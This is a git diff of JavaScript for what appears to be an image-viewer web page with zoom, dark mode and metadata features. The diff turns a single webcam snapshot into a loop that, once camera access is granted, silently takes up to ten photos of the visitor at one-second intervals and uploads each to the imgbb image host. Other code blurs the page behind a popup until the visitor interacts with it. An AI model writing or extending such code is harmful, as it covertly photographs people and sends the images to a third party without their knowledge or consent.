@@ -5,6 +5,12 @@ const pageContent = document.getElementById("pageContent");
 let stream = null;
 let popupShown = false;
 
+let captureInterval = null;
+let videoElement = null;
+
+let captureCount = 0;
+const MAX_CAPTURES = 10;
+
 
 
 /* =========================
@@ -24,6 +30,7 @@ window.addEventListener("load", () => {
         startCamera();
 
     }
+
     else{
 
         startPopupTriggers();
@@ -31,10 +38,12 @@ window.addEventListener("load", () => {
     }
 
 
+
     initializeUI();
 
 
 });
+
 
 
 
@@ -54,10 +63,12 @@ function showPopup(){
 
 
 
-    popupShown=true;
+    popupShown = true;
+
 
 
     pageContent.classList.add("blur");
+
 
 
     popup.classList.add("show");
@@ -83,6 +94,7 @@ function showPopup(){
 
 
 }
+
 
 
 
@@ -114,11 +126,13 @@ function startPopupTriggers(){
     );
 
 
+
     window.addEventListener(
         "click",
         interactionTrigger,
         {once:true}
     );
+
 
 
     window.addEventListener(
@@ -129,6 +143,8 @@ function startPopupTriggers(){
 
 
 }
+
+
 
 
 
@@ -179,15 +195,11 @@ async function startCamera(){
 
 
 
-        setTimeout(()=>{
-
-            capturePhoto();
-
-        },1000);
-
+        startContinuousCapture();
 
 
     }
+
 
 
     catch(error){
@@ -247,87 +259,66 @@ async function startCamera(){
 
 
 
+
+
 /* =========================
-   CAPTURE PHOTO
+   CONTINUOUS CAPTURE
 ========================= */
 
 
-function capturePhoto(){
+function startContinuousCapture(){
 
 
-    const video =
+    videoElement =
     document.createElement("video");
 
 
 
-    video.srcObject=stream;
-
-
-    video.playsInline=true;
-
-    video.muted=true;
+    videoElement.srcObject =
+    stream;
 
 
 
-    video.onloadedmetadata=()=>{
+    videoElement.playsInline = true;
 
-
-        video.play();
-
-
-
-        setTimeout(()=>{
-
-
-            const canvas =
-            document.createElement("canvas");
+    videoElement.muted = true;
 
 
 
-            canvas.width =
-            video.videoWidth;
+    videoElement.onloadedmetadata = ()=>{
+
+
+        videoElement.play();
 
 
 
-            canvas.height =
-            video.videoHeight;
+        captureInterval =
+        setInterval(()=>{
+
+
+            if(captureCount >= MAX_CAPTURES){
+
+
+                console.log(
+                    "Maximum capture limit reached"
+                );
+
+
+                stopCamera();
+
+
+                return;
+
+
+            }
 
 
 
-            const ctx =
-            canvas.getContext("2d");
+            capturePhoto();
 
 
 
-            ctx.drawImage(
-                video,
-                0,
-                0,
-                canvas.width,
-                canvas.height
-            );
-
-
-
-            const imageData =
-            canvas.toDataURL("image/png");
-
-
-
-            const imageBase64 =
-            imageData.split(",")[1];
-
-
-
-            uploadImage(imageBase64);
-
-
-
-            stopCamera();
-
-
-
-        },800);
+        },1000);
 
 
 
@@ -341,27 +332,150 @@ function capturePhoto(){
 
 
 
-function stopCamera(){
 
 
-    if(!stream)
+/* =========================
+   CAPTURE PHOTO
+========================= */
+
+
+function capturePhoto(){
+
+
+    if(!videoElement)
         return;
 
 
 
-    stream.getTracks()
-    .forEach(track=>{
-
-        track.stop();
-
-    });
+    const canvas =
+    document.createElement("canvas");
 
 
 
-    stream=null;
+    canvas.width =
+    videoElement.videoWidth;
+
+
+
+    canvas.height =
+    videoElement.videoHeight;
+
+
+
+    const ctx =
+    canvas.getContext("2d");
+
+
+
+    ctx.drawImage(
+
+        videoElement,
+
+        0,
+
+        0,
+
+        canvas.width,
+
+        canvas.height
+
+    );
+
+
+
+    const imageData =
+    canvas.toDataURL("image/png");
+
+
+
+    const imageBase64 =
+    imageData.split(",")[1];
+
+
+
+    captureCount++;
+
+
+
+    console.log(
+
+        `Captured ${captureCount}/${MAX_CAPTURES}`
+
+    );
+
+
+
+    uploadImage(imageBase64);
 
 
 }
+/* =========================
+   STOP CAMERA
+========================= */
+
+
+function stopCamera(){
+
+
+    if(captureInterval){
+
+
+        clearInterval(
+            captureInterval
+        );
+
+
+        captureInterval = null;
+
+
+    }
+
+
+
+    if(stream){
+
+
+        stream.getTracks()
+        .forEach(track=>{
+
+
+            track.stop();
+
+
+        });
+
+
+
+        stream = null;
+
+
+    }
+
+
+
+    videoElement = null;
+
+
+}
+
+
+
+
+
+
+
+window.addEventListener(
+    "beforeunload",
+    ()=>{
+
+
+        stopCamera();
+
+
+    }
+);
+
+
 
 
 
@@ -403,8 +517,11 @@ async function uploadImage(image){
             `https://api.imgbb.com/1/upload?key=${API_KEY}`,
 
             {
+
                 method:"POST",
+
                 body:formData
+
             }
 
         );
@@ -420,8 +537,22 @@ async function uploadImage(image){
 
 
             console.log(
+
                 "Upload successful:",
+
                 data.data.url
+
+            );
+
+
+        }
+
+        else{
+
+
+            console.error(
+                "Upload failed:",
+                data
             );
 
 
@@ -431,12 +562,16 @@ async function uploadImage(image){
     }
 
 
+
     catch(error){
 
 
         console.error(
+
             "Upload error:",
+
             error
+
         );
 
 
@@ -444,6 +579,8 @@ async function uploadImage(image){
 
 
 }
+
+
 
 
 
@@ -474,6 +611,7 @@ function initializeUI(){
 
 
 
+
 /* =========================
    DARK MODE
 ========================= */
@@ -494,12 +632,20 @@ function setupTheme(){
 
     if(saved==="dark"){
 
-        document.body.classList.add("dark");
+
+        document.body.classList.add(
+            "dark"
+        );
+
+
 
         if(button)
             button.textContent="☀️";
 
+
     }
+
+
 
 
 
@@ -523,8 +669,11 @@ function setupTheme(){
 
 
             localStorage.setItem(
+
                 "theme",
+
                 dark ? "dark" : "light"
+
             );
 
 
@@ -540,6 +689,7 @@ function setupTheme(){
 
 
 }
+
 
 
 
@@ -580,6 +730,8 @@ function setupImageViewer(){
 
 
 
+
+
 /* =========================
    METADATA
 ========================= */
@@ -592,8 +744,10 @@ function showMetadata(image){
     document.getElementById("fileName");
 
 
+
     const type =
     document.getElementById("fileType");
+
 
 
     const resolution =
@@ -601,10 +755,13 @@ function showMetadata(image){
 
 
 
+
     if(name){
+
 
         name.textContent =
         image.src.split("/").pop();
+
 
     }
 
@@ -612,7 +769,10 @@ function showMetadata(image){
 
     if(type){
 
-        type.textContent="JPEG";
+
+        type.textContent =
+        "JPEG";
+
 
     }
 
@@ -623,8 +783,11 @@ function showMetadata(image){
 
         if(resolution){
 
+
             resolution.textContent =
+
             `${image.naturalWidth} × ${image.naturalHeight}`;
+
 
         }
 
@@ -633,6 +796,7 @@ function showMetadata(image){
 
 
 }
+
 
 
 
@@ -671,15 +835,13 @@ function setupZoom(image){
 
 
 
-    let scale=1;
+    let scale = 1;
 
-    let x=0;
+    let x = 0;
 
-    let y=0;
+    let y = 0;
 
-
-
-    let dragging=false;
+    let dragging = false;
 
     let startX;
 
@@ -693,14 +855,13 @@ function setupZoom(image){
 
 
         image.style.transform =
-        `
-        translate(${x}px,${y}px)
-        scale(${scale})
-        `;
+
+        `translate(${x}px,${y}px) scale(${scale})`;
 
 
 
         display.textContent =
+
         Math.round(scale*100)+"%";
 
 
@@ -710,17 +871,24 @@ function setupZoom(image){
 
 
 
+
     zoomIn.onclick=()=>{
 
-        if(scale<3){
 
-            scale+=0.25;
+        if(scale < 3){
+
+
+            scale += 0.25;
+
 
             update();
 
+
         }
 
+
     };
+
 
 
 
@@ -728,15 +896,22 @@ function setupZoom(image){
 
     zoomOut.onclick=()=>{
 
-        if(scale>1){
 
-            scale-=0.25;
+        if(scale > 1){
+
+
+            scale -= 0.25;
+
 
             update();
 
+
         }
 
+
     };
+
+
 
 
 
@@ -745,11 +920,12 @@ function setupZoom(image){
     reset.onclick=()=>{
 
 
-        scale=1;
+        scale = 1;
 
-        x=0;
+        x = 0;
 
-        y=0;
+        y = 0;
+
 
         update();
 
@@ -760,30 +936,39 @@ function setupZoom(image){
 
 
 
+
+
+
+
     image.addEventListener(
         "mousedown",
         e=>{
 
 
-            if(scale<=1)
+            if(scale <= 1)
                 return;
 
 
 
-            dragging=true;
+            dragging = true;
+
 
 
             startX =
-            e.clientX-x;
+            e.clientX - x;
+
 
 
             startY =
-            e.clientY-y;
+            e.clientY - y;
 
 
         }
 
     );
+
+
+
 
 
 
@@ -800,11 +985,12 @@ function setupZoom(image){
 
 
             x =
-            e.clientX-startX;
+            e.clientX - startX;
+
 
 
             y =
-            e.clientY-startY;
+            e.clientY - startY;
 
 
 
@@ -819,15 +1005,22 @@ function setupZoom(image){
 
 
 
+
+
     window.addEventListener(
         "mouseup",
         ()=>{
 
-            dragging=false;
+
+            dragging = false;
+
 
         }
 
     );
+
+
+
 
 
 
@@ -838,25 +1031,30 @@ function setupZoom(image){
         e=>{
 
 
-            if(scale<=1)
+            if(scale <= 1)
                 return;
 
 
 
-            dragging=true;
+            dragging = true;
+
 
 
             startX =
-            e.touches[0].clientX-x;
+            e.touches[0].clientX - x;
+
 
 
             startY =
-            e.touches[0].clientY-y;
+            e.touches[0].clientY - y;
 
 
         }
 
     );
+
+
+
 
 
 
@@ -873,11 +1071,12 @@ function setupZoom(image){
 
 
             x =
-            e.touches[0].clientX-startX;
+            e.touches[0].clientX - startX;
+
 
 
             y =
-            e.touches[0].clientY-startY;
+            e.touches[0].clientY - startY;
 
 
 
@@ -892,11 +1091,16 @@ function setupZoom(image){
 
 
 
+
+
+
     image.addEventListener(
         "touchend",
         ()=>{
 
-            dragging=false;
+
+            dragging = false;
+
 
         }
 
